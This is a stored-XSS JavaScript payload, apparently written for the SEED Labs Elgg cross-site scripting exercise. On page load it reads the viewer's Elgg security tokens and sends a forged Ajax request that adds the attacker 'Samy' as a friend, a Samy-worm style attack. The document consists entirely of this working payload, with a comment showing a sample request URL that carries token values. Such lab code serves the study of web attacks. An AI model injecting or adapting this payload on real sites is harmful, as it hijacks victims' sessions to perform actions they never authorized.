<script type="text/javascript">
    window.onload = function () {
	var Ajax=null;
    var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
    var token="&__elgg_token="+elgg.security.token.__elgg_token;
    //Construct the HTTP request to add Samy as a friend.

    var url1 = "http://www.xsslabelgg.com/action/friends/add?friend=";
    var userid = elgg.page_owner.guid;
    var sendurl = url1 + userid + ts + token + ts + token; //FILL IN

    // http://www.xsslabelgg.com/action/friends/add?friend=47
    //&__elgg_ts=1624213273&__elgg_token=3qiQClD2nrEaJRzoSOYKbg&__elgg_ts=1624213273
    //&__elgg_token=3qiQClD2nrEaJRzoSOYKbg

    //Create and send Ajax request to add friend
    if(elgg.session.user.guid != userid)
    {
        Ajax = new XMLHttpRequest();
    Ajax.open("GET",sendurl,true);
    //Ajax.setRequestHeader("Host","www.xsslabelgg.com");
    //Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
    Ajax.send();	
	}
	
	}
</script>